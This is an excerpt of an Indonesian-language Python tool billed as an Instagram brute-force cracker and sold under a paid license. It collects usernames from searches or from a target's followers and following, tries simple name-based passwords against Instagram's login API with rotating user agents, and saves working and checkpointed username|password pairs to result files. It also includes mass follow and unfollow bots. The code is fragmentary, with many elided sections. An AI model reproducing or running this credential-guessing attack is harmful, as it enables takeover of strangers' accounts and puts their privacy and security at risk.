...
L='\033[38;2;255;127;0;1m' #ORANGE
D = '\x1b[1;95m' # DA
X = '\33[33;1m' # X
B='\33[36;1m' #BIRU
H='\33[32;1m'  #HIJAU
...
def cekAPI(cookie):
	...
	try:
		...
		print(f'{K}({U}X{K}) {U}Instagram Checkpoint');sleep(4)
		os.remove('.kukis.log')
		os.remove('.username')
...
def login():
	global external
	try:
		print(f'\n{K}({H}✓{K}) {K}Mode pesawat dulu sebelum login !!\n')
		us=input(f"{K}({H}•{K}) {K}username : ")
		pw=stdiomask.getpass(prompt=f'{K}({H}•{K}) {K}password : ')
	except KeyboardInterrupt:
		exit(f'{K}({U}X{K}) KeyboardInterrupt terdeteksi... keluar !')
	...
	if x.get('status')=='success':
		...
		print(f'\n{K}({H}✓{K}) {H}yeahh!! login berhasil')
		os.system('python login.py')
	elif x.get('status')=='checkpoint':
		exit(f'{K}({C}•{K}) 😞yahh checkpoint')
	else:
		exit(f'{K}({C}X{K}) Username atau password yang anda masukan salah')
...
class instagramAPI:
	...
	DEVICE_SETTINTS = {'manufacturer': 'Xiomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
...
{K}████████████████████▀▀     ██      ██████      ██████      ██
                                                                       
{K}┌───────────────────────────{H}V.02{K}──────────────────────────────┐     
│          {K}ＩＮＳＴＡＧＲＡＭ {E}ＢＲＵＴＥ {K}ＦＯＲＣＥ           {K}│
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│( {H}• {K}) Ａｕｔｈｏｒ :   {K}Ｍｏｃｈ Ｑｉｎｎ ＸＤ                {K}│
│( {H}• {K}) Ｆｂ         :   {K}www.facebook.com/Moch.QinnXD          {K}│
│( {H}• {K}) Ｇｉｔｈｕｂ :   {K}https://github.com/MochQinnXD         {K}│
└─────────────────────────────────────────────────────────────┘

┌────┬────────────────────────────────────────────────────────┐
│ {K}NO {K}│       ✿ ＭＥＮＵ {E}ＰＩＬＩＨＡＮ {K}ＩＧＢＦ ✿             {K}│
├────┼────────────────────────────────────────────────────────┤   
│ {K}{K}01{K} │ {E}Crack dari pencarian nama {H}random                       {K}│
│ {K}{K}02{K} │ {E}Crack dari pengikut {H}masal                              {K}│
│ {K}{K}03{K} │ {E}Crack dari mengikuti {H}masal                             {K}│
│ {K}{K}04{K} │ {E}Crack ulang hasil {C}CP                                   {K}│
│ {K}{K}05{K} │ {E}Check hasil {H}Ok{K}/{C}Cp{K}                                      │
└────┴────────────────────────────────────────────────────────┘
┌────┬────────────────────{K}Menu{K}Bot{K}─────────────────────────────┐
│ {K}{K}06{K} │ {E}Bot auto unfolow {H}new{K}                                   │
│ {K}{K}07{K} │ {E}Bot auto follow {H}new{K}                                    │
└────┴────────────────────────────────────────────────────────┘
┌────┬────────────────────────────────────────────────────────┐    
│ {K}{K}08{K} │ Minta license                                          │
│ {K}{K}09{K} │ keluar{K} {M}Hapus cookies{K}                                   │
└────┴────────────────────────────────────────────────────────┘                                                        
	""")

	def BUG(self):
		print(f"""
 {E}├── {K} Lisensi 1 Bulan / 250K                  
 {E}├── {K} Anda bisa Beli langsung ke Whatsapp   
 {E}└── {C}  {K}[ 0838-6118-3874 {K}]                 
		""")
		exit()

	def Exit(self):
		x=input(f'\n {K}({M}•{K}) Apakah anda yakin ingin {M}keluar? {K}{H}y{K}/{C}t ')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python instagram.py')
	...
	def searchAPI(self,cookie,nama):
		try:
			...
			exit(f'\n {K}├── {C}Koneksi internet bermasalah!!')
			exit(f'\n {K}└── {C}Pastikan sinyal anda 4G')
		return internal
	...
	def idAPI(self,cookie,id):
		try:
			...
			exit(f"\n {E}└── {C}Koneksi internet mati ngtod")
		except Exception as e:
			exit(f"\n {E}└── {C}Username yang anda masukan tidak di temukan pastikan target bersifat publik")
		return idx
	...
	def infoAPI(self,cookie,api,id):
		try:
			...
			exit(f'\n {K}├── {C}internet bermasalah!!')
		except Exception as e:
			print(f'\n {O}({M}•{O}) Username yang anda masukan tidak di temukan')
		return internal

	def passwordAPI(self,xnx):
		print(f'\n {O}({H}✓{O}) Total ID Didapatkan: {K}[{H}{len(internal)}{K}]{K}')
		print(f"""
 {O}({H}•{O}) List kombinasi Password
	  
 {E}├── 1 {K}[{H}nama, nama123{K}]
 {E}├── 2 {K}[{H}nama, nama123, nama1234{K}]
 {E}└── 3 {K}[{H}nama, nama123, nama1234, nama12345{K}]
		""")            
		c=input(f' {E}└── Password : ')
		if c=='1':
	...
	def generateAPI(self,user,o):
		print(f""" 
 {E}├── 1 {H}UA Version 1.0 
 {E}├── 2 {H}UA Version 2.0
 {E}└── 3 {H}UA Version 3.0
		""")
		ua=input(f' {E}└── UserAgent : ')
		if ua=='1':
			uaAPI=User_Agent()
		elif ua=='2':
			uaAPI=user_agent()
		...
		print(f"""
 {E}├── {E}Hasil {H}OK {E}Tersimpan ke: result/{day}.txt
 {E}└── {E}Hasil {C}CP {E}Tersimpan ke: result/{day}.txt
		""")
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r {K}({H}CRACK{K}) 😲 {K}{loop}/{len(internal)}{K} {H}Ok: {len(success)} {C}Cp: {len(checkpoint)}{C}{K}"),
		...
		try:
			for pw in pas:
				...
				if "userId" in str(x_jason):
					...
					print(f"""\r  {E}├── {H}{user}{H}|{H}{pw}{C}
  {E}├── {E}Full Name {H}{nama}{C}
  {E}├── {E}Followers {H}{pengikut}{C}
  {E}├── {E}Following {H}{mengikut}{C}
  {E}└── {E}Posts {H}{postingan}{C}
					""")
					...
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r  {E}├── {C}{user}{C}|{C}{pw}{C}
  {E}├── {E}Full Name {C}{nama}{C}
  {E}├── {E}Followers {C}{pengikut}{C}
  {E}└── {E}Following {C}{mengikut}{C} 
					""")
					...
					sys.stdout.write(f"\r {K}({H}•{K}) {K} hidupkan mode pesawat 30 detik{C}");sys.stdout.flush();sleep(10)
	...
	def checkAPI(self,user,pw):
		try:
			...
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r  {K}├── {H}{user}{H}|{H}{pw}{C}
  {K}├── {K}Full Name {H}{nama}{C}
  {K}├── {K}Followers {H}{pengikut}{C}
  {K}├── {K}Following {H}{mengikut}{C}
  {K}└── {K}Posts {H}{postingan}{C}
				""")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r  {K}├── {C}{user}{C}|{C}{pw}{C}
  {K}├──{K} Full Name {C}{user}{C}
  {K}├──{K} Followers {C}{pengikut}{C}
  {K}└──{K} Following {C}{mengikut}{C}
				""")
	...
	def menu(self):
		...
		if c=='':
			...
			m=int(input(f'\n {O}({H}•{O}) Masukan jumlah nama pencarian: '));print('')
			for i in range(m):
				i+1
				nama=input(f'\n {O}({H}•{O}) Masukan nama pencarian ({H}{len(internal)}{K}): ')
			...
			for i in range(m):
				i+1
				nama=input(f'\n {O}({H}•{O}) Masukan username target ({H}{len(internal)}{K}): ')
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)
			...
			for i in os.listdir('result'):
				print(f' {K}({H}•{K}) {i}')
			c=input(f'\n {K}{H}>>>{K} Masukan nama file: ')
			g=open("result/%s"%(c)).read().splitlines()
			print(f'\n {K}({H}•{K}) {K}Total Result {H}{len(g)}{K}')
			print(f'\n {K}({H}•{K}) {K}Proses mengecek status akun. silahkan tunggu sebentar\n')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit(f'\n\n {K}({H}✓{K}) proses check selesai...')
			...
			xx=c.split("-")
			xc=xx[0]
			print(f'\n {K}({H}✓{K}) Total result yang di temukan [{H}{len(g)}{C}]')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
				...
				if xc=="checkpoint":
					print(f"""
  {K}├── {C}{usr}{C}|{C}{pwd}{C}
  {K}├──{C} Followers {C}{fol}{C}
  {K}└──{C} Following {C}{ful}{C}
					""");sleep(0.05)
				else:
					print(f"""
  {K}├── {H}{usr}{H}|{H}{pwd}{H}
  {K}├──{H} Followers {H}{fol}{C}
  {K}└──{H} Following {H}{ful}{C}
					""");sleep(0.05)
		elif c in ('6','06'):
			global following
			six=0
			print(f'\n {K}({H}•{K}) Bot Unfollow-All Dijalankan\n')
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{K}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n {K}({H}•{K}) Unfollow-all selesai...');self.menu()
			     
		elif c in ('7','07'):
			six=0
			print(f'\n {K}({H}•{K}) Bot Follow-All Dijalankan\n')
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',x_id)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U}}}{C} {i} {H}follow-Berhasil{K}')
				self.followAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n {K}({H}•{K}) follow-all selesai...');self.menu()	
